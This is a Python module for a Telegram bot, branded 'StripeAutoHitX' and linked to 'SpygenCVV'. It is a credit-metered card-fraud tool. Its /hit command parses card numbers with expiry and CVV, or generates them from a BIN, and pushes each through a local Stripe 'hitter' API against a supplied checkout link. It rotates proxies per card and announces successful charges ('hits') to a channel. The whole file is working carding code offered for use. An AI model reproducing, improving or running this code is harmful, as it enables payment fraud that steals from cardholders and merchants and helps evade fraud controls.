import logging
import asyncio
import time
import html
import re
import random
from typing import List, Dict, Optional, Any

import aiohttp

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS (GEN)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from gates.gen import generate_cards_with_bin_info

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS (DATABASE)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import get_user_credits, update_credits, create_user, deduct_credits_atomic, get_premium_status, update_user_hits, update_user_stats, ADMIN_IDS

# Initialize Router
router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION — Stripe-hitter3ds API (st_hit/server.py, uvicorn :8001)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
HIT_API_URL = "http://127.0.0.1:8001"
HIT_API_TIMEOUT = 90          # server-side cap is 60s
MAX_CARDS = 10             # Max cards allowed per command
PARALLEL_LIMIT = 5         # Number of parallel API checks
UPDATE_EVERY = 1           # Update UI every X cards processed
RESULTS_PER_PAGE = 10      # Cards per page in UI
HIT_CHANNEL_ID = -1004420445815  # Channel ID for Hit Detect
ADMIN_USER_ID = 6113616017

# Dedicated logger — root logger sits at WARNING, so INFO needs its own handler
logger = logging.getLogger("hit")
logger.setLevel(logging.INFO)
if not logger.handlers:
    _handler = logging.StreamHandler()
    _handler.setLevel(logging.INFO)
    _handler.setFormatter(logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s"))
    logger.addHandler(_handler)
logger.propagate = False

# Global State for Pagination (In-Memory)
STCO_SESSIONS: Dict[int, Dict[str, Any]] = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def call_hit_api(url: str, card: str, proxy: str, username: str) -> Dict[str, Any]:
    """One check against the Stripe-hitter3ds API (:8001) — replaces the old Node script."""
    timeout = aiohttp.ClientTimeout(total=HIT_API_TIMEOUT)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.post(
            f"{HIT_API_URL}/check",
            json={"url": url, "card": card, "proxy": proxy, "username": username},
        ) as resp:
            data = await resp.json(content_type=None)
            if not isinstance(data, dict):
                raise ValueError(f"Unexpected API response (HTTP {resp.status})")
            return data

async def send_hit_message(bot: Bot, resp_code: str, amount: str, user_name: str, user_id: int):
    """Sends the Hit Detect message to the channel."""
    try:
        user_link = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"
        dev_link = '<a href="tg://openmessage?user_id=6113616017">SpygenCVV</a>'

        hit_msg = (
            f"<b>𝗛𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 ➛</b> <b>𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 <tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji></b>\n"
            f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> <b>StripeAutoHitX</b>\n"
            f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛</b> <b>{html.escape(resp_code)}</b>\n"
            f"<b>𝗔𝗺𝗼𝘂𝗻𝘁 ➛</b> <b>{html.escape(amount)}</b>\n"
            f"<b>𝗨𝘀𝗲𝗿 ➛</b> <b>{user_link}</b>\n"
            f"<b>𝗗𝗲𝘃 ➛</b> {dev_link}"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="𝗫𝗖𝗢𝗡 ★ 𝗫𝟯 ", url="t.me/SpygenCVV_CHKBOT", style="primary", icon_custom_emoji_id="5827986023254072662")]
        ])

        await bot.send_message(
            chat_id=HIT_CHANNEL_ID,
            text=hit_msg,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Failed to send hit message: {e}")

def is_bin_pattern(text: str) -> bool:
    return text.isdigit() and 6 <= len(text) <= 8


async def get_user_proxies(user_id: int) -> List[str]:
    proxies = []
    try:
        def _sync_fetch():
            import database
            docs = database.get_user_proxies(user_id)
            return [d["proxy"] for d in docs]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logger.error(f"Error fetching proxies for {user_id}: {e}")
    return proxies


def db_proxy_to_url(proxy_str: str) -> str:
    parts = proxy_str.split()
    if len(parts) == 4:
        p_user, p_pass, p_ip, p_port = parts
        return f"http://{p_user}:{p_pass}@{p_ip}:{p_port}"
    return proxy_str


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER (UPDATED WITH CREDIT DEDUCTION)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/hit"))
async def stco_command(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"
    username = message.from_user.username

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    url = ""
    raw_cards = []

    # 1. Manual parsing to avoid 'get_args' attribute error
    text_content = message.text or ""
    parts = text_content.split()[1:] if " " in text_content else []

    if parts:
        potential_url = parts[0]
        if potential_url.startswith("http"):
            url = potential_url
            raw_cards.extend(parts[1:])

    # Safely check for reply_to_message
    if message.reply_to_message:
        replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_cards.extend(replied_text.split('\n'))

    # 2. Validate URL
    if not url:
        await message.reply(
            "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Invalid Format!</b>\n\n"
            "Usage: <code>/hit &lt;checkout_link&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a list of cards.",
            parse_mode="HTML"
        )
        return

    # 3. Extract Cards with Regex
    card_pattern = re.compile(r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})')

    valid_cards = []
    seen = set()

    for item in raw_cards:
        match = card_pattern.search(item)
        if match:
            cc, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            formatted = f"{cc}|{mm}|{yy}|{cvv}"
            if formatted not in seen:
                seen.add(formatted)
                valid_cards.append(formatted)

    # 4. Limits Check — trim to MAX_CARDS
    if len(valid_cards) > MAX_CARDS:
        valid_cards = valid_cards[:MAX_CARDS]

    # 4a. BIN AUTO-GENERATION FALLBACK
    if not valid_cards:
        bin_pattern = None
        gen_amount = 20

        for item in raw_cards:
            item = item.strip()
            if is_bin_pattern(item):
                bin_pattern = item
                break

        if bin_pattern:
            for item in raw_cards:
                item = item.strip()
                if item != bin_pattern and item.isdigit():
                    gen_amount = min(int(item), MAX_CARDS)
                    break

            gen_amount = min(gen_amount, MAX_CARDS)
            try:
                gen_cards, _ = await generate_cards_with_bin_info(bin_pattern, "rnd", "rnd", gen_amount, "rnd")
                valid_cards = gen_cards
                await message.reply(
                    f"<tg-emoji emoji-id=\"5879783483462655267\">⚡</tg-emoji> <b>Generated {len(gen_cards)} cards from BIN {bin_pattern[:6]}</b>",
                    parse_mode="HTML"
                )
            except Exception as e:
                await message.reply(
                    f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Failed to generate cards: {e}</b>",
                    parse_mode="HTML"
                )
                return

    if not valid_cards:
        await message.reply("<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> No valid cards found.", parse_mode="HTML")
        return

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # CREDIT DEDUCTION LOGIC
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    try:
        # A. Ensure user exists in DB
        await asyncio.to_thread(create_user, user_id, username)

        # B. Check current credits
        if not is_premium and user_id not in ADMIN_IDS:
            current_credits = await asyncio.to_thread(get_user_credits, user_id)

            if current_credits is None or current_credits < 1:
                await message.reply(
                    "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Insufficient Credits!</b>\n\n"
                    "You need at least 1 credit to use this command.\n"
                    "Contact admin to top up.",
                    parse_mode="HTML"
                )
                return

        # C. Deduct 1 credit atomically
        if not is_premium and user_id not in ADMIN_IDS:
            new_balance = await asyncio.to_thread(deduct_credits_atomic, user_id, 1)

            # Debug log
            logger.info(f"[STCO CREDIT] User {user_id} deducted 1 credit. New balance: {new_balance}")

    except Exception as e:
        logger.error(f"Failed to process credits for user {user_id}: {e}")
        await message.reply("<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> <b>Database Error.</b>\nCould not verify credits. Please try again.", parse_mode="HTML")
        return

    # 5. Fetch proxies from DB — user first, then admin fallback
    proxy_urls = await get_user_proxies(user_id)
    if not proxy_urls:
        proxy_urls = await get_user_proxies(ADMIN_USER_ID)
    proxy_urls = list(set([db_proxy_to_url(p) for p in proxy_urls])) if proxy_urls else []

    # 6. Start Async Task (Non-blocking)
    asyncio.create_task(
        run_stco_check(message, url, valid_cards, user_name, user_id, proxy_urls)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER & UI LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_stco_check(message: types.Message, url: str, cards: List[str], user_name: str, user_id: int, proxy_urls: List[str] = None):

    start_time = time.time()
    total_cards = len(cards)
    user_link = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"
    bot = message.bot

    # Initial Status Message — sent as a reply to the user's command
    status_msg = await message.reply(
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>{total_cards}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <code>StripeAutoHitX</code>\n"
        f"𝗧𝗶𝗺𝗲 ➛ <code>0.0s</code>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"⏳ <b>𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸...</b>",
        parse_mode="HTML", disable_web_page_preview=True
    )
    msg_id = status_msg.message_id

    # Initialize Session State
    STCO_SESSIONS[msg_id] = {
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
        "amount": "N/A",
        "final_status": "checking"  # checking, completed, expired
    }

    # Semaphore to limit parallel API checks
    sem = asyncio.Semaphore(PARALLEL_LIMIT)

    async def worker(card: str):
        async with sem:
            # Rotate proxy per card (empty → API falls back to direct)
            card_proxy = random.choice(proxy_urls) if proxy_urls else ""
            logger.info(f"[HIT] request user={user_id} card={card} site={url[:70]} proxy={card_proxy.split('@')[-1][:45] if card_proxy else 'direct'}")
            try:
                res = await call_hit_api(url, card, card_proxy, f"tg{user_id}")
            except Exception as e:
                logger.error(f"[HIT] API error card={card}: {e}")
                return {
                    "card": card,
                    "resp": "api error",
                    "status": "error",
                    "symbol": "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji>",
                    "link": ""
                }

            label = str(res.get("Response") or res.get("error") or "Error")
            approved = str(res.get("Approved", "False")).lower() == "true"
            price = str(res.get("Price") or "?")
            status_code = str(res.get("status_code") or "")
            low = label.lower()

            # Amount shown in the header (e.g. "INR 1001.58")
            if price not in ("?", "", "None") and STCO_SESSIONS[msg_id]["amount"] == "N/A":
                STCO_SESSIONS[msg_id]["amount"] = price

            # Classify → status/symbol
            symbol = "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji>"
            if approved or low.startswith("approved"):
                status = "approved"
                symbol = "<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>"
            elif ("session expired" in low or "not reusable" in low
                  or status_code in ("checkout_session_expired", "pi_state_blocks_reuse")):
                status = "expired"
            elif "declined" in low or "fraudulent" in low:
                status = "declined"
            else:
                status = "error"

            resp = label if (not status_code or status == "expired") else f"{label} | {status_code}"
            logger.info(f"[HIT] response card={card} status={status} resp={resp[:70]} price={price}")

            return {
                "card": card,
                "resp": resp,
                "status": status,
                "symbol": symbol,
                "link": ""
            }

    # Create tasks
    tasks = [asyncio.create_task(worker(cc)) for cc in cards]

    results = []
    pending = set(tasks)
    is_expired = False

    # Process tasks as they complete
    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)

        for task in done:
            try:
                res = task.result()
                results.append(res)

                # 1. CHECK FOR HIT
                if res.get('symbol') == '<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>':
                    asyncio.create_task(
                        send_hit_message(
                            bot,
                            res.get('resp'),
                            STCO_SESSIONS[msg_id]['amount'],
                            user_name,
                            user_id
                        )
                    )
                    asyncio.create_task(asyncio.to_thread(update_user_hits, user_id))
                    asyncio.create_task(asyncio.to_thread(update_user_stats, user_id, True))

                # 2. CHECK FOR SESSION EXPIRED
                if res.get('status') == 'expired':
                    is_expired = True
                    STCO_SESSIONS[msg_id]["final_status"] = "expired"
                    # Cancel remaining tasks
                    for p in pending:
                        p.cancel()
                    pending.clear()
                    break
            except Exception as e:
                logger.error(f"Worker task error: {e}")

        if is_expired:
            break

        # Sort: Hits first, then others
        results.sort(key=lambda x: 0 if x['symbol'] == "<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>" else 1)

        # Update UI periodically
        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            STCO_SESSIONS[msg_id]["results"] = results
            STCO_SESSIONS[msg_id]["elapsed_final"] = elapsed

            text = format_page_content(STCO_SESSIONS[msg_id], elapsed, is_working=True)

            # Only show "Checking..." if still running and not expired
            if not is_expired and len(results) < total_cards:
                text += f"\n\n⏳ <b>𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(results)}/{total_cards}...</b>"

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except TelegramBadRequest:
                pass
            except Exception as e:
                logger.error(f"UI Update error: {e}")

    # Finalize
    elapsed_final = round(time.time() - start_time, 2)
    STCO_SESSIONS[msg_id]["elapsed_final"] = elapsed_final

    if not is_expired:
        STCO_SESSIONS[msg_id]["final_status"] = "completed"

    footer_text = "\n\n<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji> <b>𝗰𝗵𝗲𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"
    if is_expired:
        footer_text = "\n\n<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> <b>𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 — 𝗯𝗮𝘁𝗰𝗵 𝘀𝘁𝗼𝗽𝗽𝗲𝗱.</b>"

    final_text = format_page_content(STCO_SESSIONS[msg_id], elapsed_final, is_working=False)
    final_text += footer_text

    try:
        await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FORMATTING & CALLBACKS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def format_page_content(state: Dict[str, Any], elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * RESULTS_PER_PAGE
    page_results = results[start_idx : start_idx + RESULTS_PER_PAGE]

    user_link = f"<a href='tg://user?id={state['user_id']}'>{html.escape(state['user_name'])}</a>"
    amount = state.get('amount', 'N/A')

    text = (
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>{len(results)}/{state['total_cards']}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ <code>StripeAutoHitX</code>\n"
        f"𝗔𝗺𝗼𝘂𝗻𝘁 ➛ <code>{html.escape(amount)}</code>\n"
        f"𝗧𝗶𝗺𝗲 ➛ <code>{elapsed}s</code>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        resp_text = html.escape(res.get('resp', 'unknown')).lower()

        if res.get('symbol') == "<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji>" and res.get('link'):
            resp_text = f"succeeded | <a href='{res['link']}'>success_url</a>"

        text += (
            f"\n<code>{res['card']}</code> {res.get('symbol', '')}\n"
            f"<b>{resp_text}</b>\n"
            f"━━━━━━━━━━━━━━━━"
        )

    return text

def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = STCO_SESSIONS.get(msg_id)
    if not state: return None

    total = len(state["results"])
    if total == 0: return None

    pages = (total + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE
    current = state["page"]

    buttons = []
    row = []

    if current > 0:
        row.append(InlineKeyboardButton(text="Back", callback_data=f"stco_prev_{msg_id}", style="primary"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next", callback_data=f"stco_next_{msg_id}", style="primary"))

    if row:
        buttons.append(row)

    if not buttons:
        return None

    return InlineKeyboardMarkup(inline_keyboard=buttons)

@router.callback_query(F.data.startswith("stco_"))
async def stco_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        await callback.answer("Invalid callback")
        return

    try:
        msg_id = int(parts[2])
    except ValueError:
        await callback.answer("Invalid ID")
        return

    state = STCO_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired or not found.", show_alert=True)
        return

    if callback.from_user.id != state['user_id']:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE

    if action == "next" and state['page'] < total_pages - 1:
        state['page'] += 1
    elif action == "prev" and state['page'] > 0:
        state['page'] -= 1

    await callback.answer()

    elapsed = state.get('elapsed_final', round(time.time() - state['start_time'], 2))
    text = format_page_content(state, elapsed, is_working=False)

    final_status = state.get('final_status', 'checking')
    if final_status == 'expired':
        text += "\n\n<tg-emoji emoji-id=\"5213205860498549992\">⚠️</tg-emoji> <b>𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 — 𝗯𝗮𝘁𝗰𝗵 𝘀𝘁𝗼𝗽𝗽𝗲𝗱.</b>"
    elif final_status == 'completed':
        text += "\n\n<tg-emoji emoji-id=\"5870702999180942496\">✅</tg-emoji> <b>𝗰𝗵𝗲𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"
    else:
        text += f"\n\n⏳ <b>𝗰𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(state['results'])}/{state['total_cards']}...</b>"

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass
